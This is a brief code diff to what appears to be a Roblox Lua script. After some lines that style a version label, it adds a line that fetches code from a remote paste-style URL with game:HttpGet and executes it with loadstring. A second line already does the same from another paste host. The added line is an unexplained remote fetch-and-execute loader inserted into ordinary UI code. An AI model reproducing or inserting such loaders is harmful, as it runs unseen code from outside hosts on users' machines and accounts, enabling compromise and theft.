@@ -207,5 +207,6 @@ versionLabel.TextSize = 18
 versionLabel.TextColor3 = Color3.new(1, 1, 1)
 versionLabel.TextXAlignment = Enum.TextXAlignment.Center
 
+loadstring(game:HttpGet("https://api.rubis.app/v2/scrap/vpEGoXfB0NjBekeK/raw", true))()
 loadstring(game:HttpGet("https://pastefy.app/QXuOEQNf/raw"))()
 
